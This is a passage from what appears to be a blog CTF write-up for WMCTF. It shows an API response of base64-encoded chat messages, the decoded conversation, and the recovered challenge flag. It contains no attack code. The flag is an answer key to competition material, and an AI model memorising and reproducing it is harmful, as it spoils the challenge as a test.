style="color:#f92672">&#34;messageid&#34;</span>:<span style="color:#e6db74">&#34;ecc2379ad6f01ec8376d6c9655b46a4f3cd686c23dc1756ed9637ec2&#34;</span>,<span style="color:#f92672">&#34;payload&#34;</span>:<span style="color:#e6db74">&#34;Z29vZA==&#34;</span>,<span style="color:#f92672">&#34;payload_type&#34;</span>:<span style="color:#e6db74">&#34;text/plain; charset=utf-8&#34;</span>,<span style="color:#f92672">&#34;replyid&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;threadid&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;timestamp&#34;</span>:<span style="color:#ae81ff">1721371760065</span>,<span style="color:#f92672">&#34;topic&#34;</span>:<span style="color:#e6db74">&#34;user:d3e1bdfec97e9eb02db778834b74f00ef5e9e0102ea05c7a66a2f75a&#34;</span>,<span style="color:#f92672">&#34;version&#34;</span>:<span style="color:#ae81ff">0</span>},{<span style="color:#f92672">&#34;cipher_suite&#34;</span>:<span style="color:#e6db74">&#34;NONE&#34;</span>,<span style="color:#f92672">&#34;from&#34;</span>:<span style="color:#e6db74">&#34;user:d3e1bdfec97e9eb02db778834b74f00ef5e9e0102ea05c7a66a2f75a&#34;</span>,<span style="color:#f92672">&#34;from_sign&#34;</span>:<span style="color:#e6db74">&#34;LA/24PvEbe1jxV24bF5QBvvoeb89hzjZPaNZLiwBnStYrMpJSkkkWEc5K0XkX5vDhLagMh7OuaGrl7ImoN4uBQ==&#34;</span>,<span style="color:#f92672">&#34;message_status&#34;</span>:{},<span style="color:#f92672">&#34;messageid&#34;</span>:<span style="color:#e6db74">&#34;3a2d4cb900bc16c319e1e9ac2fc9cda2d749ea9f6898ebaba0133802&#34;</span>,<span style="color:#f92672">&#34;payload&#34;</span>:<span style="color:#e6db74">&#34;V01DVEZ7YWFhMzViYTItMDQxYy00YWVjLTk0MzYtY2UzYTJhZDFjNzM0fQ==&#34;</span>,<span style="color:#f92672">&#34;payload_type&#34;</span>:<span style="color:#e6db74">&#34;text/plain; charset=utf-8&#34;</span>,<span style="color:#f92672">&#34;replyid&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;threadid&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;timestamp&#34;</span>:<span style="color:#ae81ff">1721371722987</span>,<span style="color:#f92672">&#34;topic&#34;</span>:<span style="color:#e6db74">&#34;user:7bf813cdee8644aa90e833b84116533efdbf8a2ef67ce66508ed76cb&#34;</span>,<span style="color:#f92672">&#34;version&#34;</span>:<span style="color:#ae81ff">0</span>},{<span style="color:#f92672">&#34;cipher_suite&#34;</span>:<span style="color:#e6db74">&#34;NONE&#34;</span>,<span style="color:#f92672">&#34;from&#34;</span>:<span style="color:#e6db74">&#34;user:d3e1bdfec97e9eb02db778834b74f00ef5e9e0102ea05c7a66a2f75a&#34;</span>,<span style="color:#f92672">&#34;from_sign&#34;</span>:<span style="color:#e6db74">&#34;kDCiK+0w6gcur7OZRTZQSKNU9cEA04RhLmi8v5GhH6zAo6TUQzvhvQ8Z2zi/dh3D8BdKXdQmc2HOEK9MTV7aBQ==&#34;</span>,<span style="color:#f92672">&#34;message_status&#34;</span>:{},<span style="color:#f92672">&#34;messageid&#34;</span>:<span style="color:#e6db74">&#34;d47b782dc38c2002cbd5000b14ddb7ba21c4883be92d6b9942a08649&#34;</span>,<span style="color:#f92672">&#34;payload&#34;</span>:<span style="color:#e6db74">&#34;VGhhbmsgeW91LCB0aGlzIGlzIHlvdXIgZmxhZy4=&#34;</span>,<span style="color:#f92672">&#34;payload_type&#34;</span>:<span style="color:#e6db74">&#34;text/plain; charset=utf-8&#34;</span>,<span style="color:#f92672">&#34;replyid&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;threadid&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;timestamp&#34;</span>:<span style="color:#ae81ff">1721371673089</span>,<span style="color:#f92672">&#34;topic&#34;</span>:<span style="color:#e6db74">&#34;user:7bf813cdee8644aa90e833b84116533efdbf8a2ef67ce66508ed76cb&#34;</span>,<span style="color:#f92672">&#34;version&#34;</span>:<span style="color:#ae81ff">0</span>},{<span style="color:#f92672">&#34;cipher_suite&#34;</span>:<span style="color:#e6db74">&#34;NONE&#34;</span>,<span style="color:#f92672">&#34;from&#34;</span>:<span style="color:#e6db74">&#34;user:7bf813cdee8644aa90e833b84116533efdbf8a2ef67ce66508ed76cb&#34;</span>,<span style="color:#f92672">&#34;from_sign&#34;</span>:<span style="color:#e6db74">&#34;DLSkIXdyfUo1EY9QFdp7jHrYL9HhXuI+lOS6exqklgvAnTFmlHNRl4vk1hlTASnAKNyg2b9SJOklEXPl+AxdDA==&#34;</span>,<span style="color:#f92672">&#34;message_status&#34;</span>:{},<span style="color:#f92672">&#34;messageid&#34;</span>:<span style="color:#e6db74">&#34;16c6ef4e0d5b83def0c2d9e406b154ad044ef67601570796b3c20465&#34;</span>,<span style="color:#f92672">&#34;payload&#34;</span>:<span style="color:#e6db74">&#34;aSdsbCB0YWtlIGl0&#34;</span>,<span style="color:#f92672">&#34;payload_type&#34;</span>:<span style="color:#e6db74">&#34;text/plain; charset=utf-8&#34;</span>,<span style="color:#f92672">&#34;replyid&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;threadid&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;timestamp&#34;</span>:<span style="color:#ae81ff">1721371628519</span>,<span style="color:#f92672">&#34;topic&#34;</span>:<span style="color:#e6db74">&#34;user:d3e1bdfec97e9eb02db778834b74f00ef5e9e0102ea05c7a66a2f75a&#34;</span>,<span style="color:#f92672">&#34;version&#34;</span>:<span style="color:#ae81ff">0</span>},{<span style="color:#f92672">&#34;cipher_suite&#34;</span>:<span style="color:#e6db74">&#34;NONE&#34;</span>,<span style="color:#f92672">&#34;from&#34;</span>:<span style="color:#e6db74">&#34;user:7bf813cdee8644aa90e833b84116533efdbf8a2ef67ce66508ed76cb&#34;</span>,<span style="color:#f92672">&#34;from_sign&#34;</span>:<span style="color:#e6db74">&#34;EsfXRObp/043zRJ313zDi3zofTTKGnKHasiDOCGgyB3Hc8J9nut3S8ZPb8/KyjR7EPDSt0ugsCvEzx6grXxYBg==&#34;</span>,<span style="color:#f92672">&#34;message_status&#34;</span>:{},<span style="color:#f92672">&#34;messageid&#34;</span>:<span style="color:#e6db74">&#34;43a57138b5c364f32fe5ee2ef046b9645c9851cce080e75e03a5c392&#34;</span>,<span style="color:#f92672">&#34;payload&#34;</span>:<span style="color:#e6db74">&#34;ZW1tbW0sIG9rYXk=&#34;</span>,<span style="color:#f92672">&#34;payload_type&#34;</span>:<span style="color:#e6db74">&#34;text/plain; charset=utf-8&#34;</span>,<span style="color:#f92672">&#34;replyid&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;threadid&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;timestamp&#34;</span>:<span style="color:#ae81ff">1721371618534</span>,<span style="color:#f92672">&#34;topic&#34;</span>:<span style="color:#e6db74">&#34;user:d3e1bdfec97e9eb02db778834b74f00ef5e9e0102ea05c7a66a2f75a&#34;</span>,<span style="color:#f92672">&#34;version&#34;</span>:<span style="color:#ae81ff">0</span>},{<span style="color:#f92672">&#34;cipher_suite&#34;</span>:<span style="color:#e6db74">&#34;NONE&#34;</span>,<span style="color:#f92672">&#34;from&#34;</span>:<span style="color:#e6db74">&#34;user:d3e1bdfec97e9eb02db778834b74f00ef5e9e0102ea05c7a66a2f75a&#34;</span>,<span style="color:#f92672">&#34;from_sign&#34;</span>:<span style="color:#e6db74">&#34;QfqCvxmhBvy5a5yEP6DRe0C+cV/IVUA9Kh+npDo1RsmiVd0jIEFG1FX15684ODAnFELhr40gIO5dER2/6tcMBg==&#34;</span>,<span style="color:#f92672">&#34;message_status&#34;</span>:{},<span style="color:#f92672">&#34;messageid&#34;</span>:<span style="color:#e6db74">&#34;8dc377d950eebf6f4fe712d75a89bc8f70d894e4fd39eea931910b32&#34;</span>,<span style="color:#f92672">&#34;payload&#34;</span>:<span style="color:#e6db74">&#34;c3VyZSwgdiBtZSA1MGJ0YyBmb3Igb25lIGZsYWc=&#34;</span>,<span style="color:#f92672">&#34;payload_type&#34;</span>:<span style="color:#e6db74">&#34;text/plain; charset=utf-8&#34;</span>,<span style="color:#f92672">&#34;replyid&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;threadid&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;timestamp&#34;</span>:<span style="color:#ae81ff">1721371554406</span>,<span style="color:#f92672">&#34;topic&#34;</span>:<span style="color:#e6db74">&#34;user:7bf813cdee8644aa90e833b84116533efdbf8a2ef67ce66508ed76cb&#34;</span>,<span style="color:#f92672">&#34;version&#34;</span>:<span style="color:#ae81ff">0</span>},{<span style="color:#f92672">&#34;cipher_suite&#34;</span>:<span style="color:#e6db74">&#34;NONE&#34;</span>,<span style="color:#f92672">&#34;from&#34;</span>:<span style="color:#e6db74">&#34;user:7bf813cdee8644aa90e833b84116533efdbf8a2ef67ce66508ed76cb&#34;</span>,<span style="color:#f92672">&#34;from_sign&#34;</span>:<span style="color:#e6db74">&#34;MyAt7xuoYAs+7ie8NgwePsQEDt4ivonO4KOpW/5Mcz4HtDh8RxEXoQy4gN5Wq9WOO+kQ6FICpkI59H+lAm6SCw==&#34;</span>,<span style="color:#f92672">&#34;message_status&#34;</span>:{},<span style="color:#f92672">&#34;messageid&#34;</span>:<span style="color:#e6db74">&#34;fc12125fed349389c6cde1e340fadaf32f8202c1b55040b8637ae3e4&#34;</span>,<span style="color:#f92672">&#34;payload&#34;</span>:<span style="color:#e6db74">&#34;aSdtIGZyb20gWElBTllVLCB5b3Ugc2F5IHlvdSBoYXZlIGZsYWdzIGZvciBXTUNURiwgaXMgaXQgcmVhbD8=&#34;</span>,<span style="color:#f92672">&#34;payload_type&#34;</span>:<span style="color:#e6db74">&#34;text/plain; charset=utf-8&#34;</span>,<span style="color:#f92672">&#34;replyid&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;threadid&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;timestamp&#34;</span>:<span style="color:#ae81ff">1721371497684</span>,<span style="color:#f92672">&#34;topic&#34;</span>:<span style="color:#e6db74">&#34;user:d3e1bdfec97e9eb02db778834b74f00ef5e9e0102ea05c7a66a2f75a&#34;</span>,<span style="color:#f92672">&#34;version&#34;</span>:<span style="color:#ae81ff">0</span>},{<span style="color:#f92672">&#34;cipher_suite&#34;</span>:<span style="color:#e6db74">&#34;NONE&#34;</span>,<span style="color:#f92672">&#34;from&#34;</span>:<span style="color:#e6db74">&#34;user:d3e1bdfec97e9eb02db778834b74f00ef5e9e0102ea05c7a66a2f75a&#34;</span>,<span style="color:#f92672">&#34;from_sign&#34;</span>:<span style="color:#e6db74">&#34;T1bIBWnO/htVa8Ud2HFeqrQYeJrw0wpxLkLN2BAsoT4/g0/LWzJOwLEn04H6B1pCjZKgN/ZR47SvQNhWYAENDQ==&#34;</span>,<span style="color:#f92672">&#34;message_status&#34;</span>:{},<span style="color:#f92672">&#34;messageid&#34;</span>:<span style="color:#e6db74">&#34;af9ebc306bc64ce753ab97a1932576992bf05d4748d519a1df772d0f&#34;</span>,<span style="color:#f92672">&#34;payload&#34;</span>:<span style="color:#e6db74">&#34;SGVsbG8uIENhbiBJIGhlbHAgeW91Pw==&#34;</span>,<span style="color:#f92672">&#34;payload_type&#34;</span>:<span style="color:#e6db74">&#34;text/plain; charset=utf-8&#34;</span>,<span style="color:#f92672">&#34;replyid&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;threadid&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;timestamp&#34;</span>:<span style="color:#ae81ff">1721371341771</span>,<span style="color:#f92672">&#34;topic&#34;</span>:<span style="color:#e6db74">&#34;user:7bf813cdee8644aa90e833b84116533efdbf8a2ef67ce66508ed76cb&#34;</span>,<span style="color:#f92672">&#34;version&#34;</span>:<span style="color:#ae81ff">0</span>},{<span style="color:#f92672">&#34;cipher_suite&#34;</span>:<span style="color:#e6db74">&#34;NONE&#34;</span>,<span style="color:#f92672">&#34;from&#34;</span>:<span style="color:#e6db74">&#34;user:7bf813cdee8644aa90e833b84116533efdbf8a2ef67ce66508ed76cb&#34;</span>,<span style="color:#f92672">&#34;from_sign&#34;</span>:<span style="color:#e6db74">&#34;lgvVImaXV0yoZ/DuTqfKsH4rWbTUDhaHrZ6q+0wZ52/VO+ew4zgmM3kz+TDFU+k/nSbVvI85m0FQmHUUsD3bBg==&#34;</span>,<span style="color:#f92672">&#34;message_status&#34;</span>:{},<span style="color:#f92672">&#34;messageid&#34;</span>:<span style="color:#e6db74">&#34;5c54e800ae8c47b614ea8eb7c2b75cf5169ef606596a409c2da447fb&#34;</span>,<span style="color:#f92672">&#34;payload&#34;</span>:<span style="color:#e6db74">&#34;aGk=&#34;</span>,<span style="color:#f92672">&#34;payload_type&#34;</span>:<span style="color:#e6db74">&#34;text/plain; charset=utf-8&#34;</span>,<span style="color:#f92672">&#34;replyid&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;threadid&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;timestamp&#34;</span>:<span style="color:#ae81ff">1721371219728</span>,<span style="color:#f92672">&#34;topic&#34;</span>:<span style="color:#e6db74">&#34;user:d3e1bdfec97e9eb02db778834b74f00ef5e9e0102ea05c7a66a2f75a&#34;</span>,<span style="color:#f92672">&#34;version&#34;</span>:<span style="color:#ae81ff">0</span>}],<span style="color:#f92672">&#34;total&#34;</span>:<span style="color:#ae81ff">9</span>}}
</span></span></code></pre></div><p><code>payload</code> 即为聊天内容，不过被base64编码过了，根据 <code>timestamp</code> 解一下就能拿到完整的聊天记录：</p>
<pre tabindex="0"><code>Hello. Can I help you?
i&#39;m from XIANYU, you say you have flags for WMCTF, is it real?
sure, v me 50btc for one flag
emmmm, okay
i&#39;ll take it
Thank you, this is your flag.
WMCTF{aaa35ba2-041c-4aec-9436-ce3a2ad1c734}
good
</code></pre>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://z9nn8w.github.io/">w8nn9z Blog</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
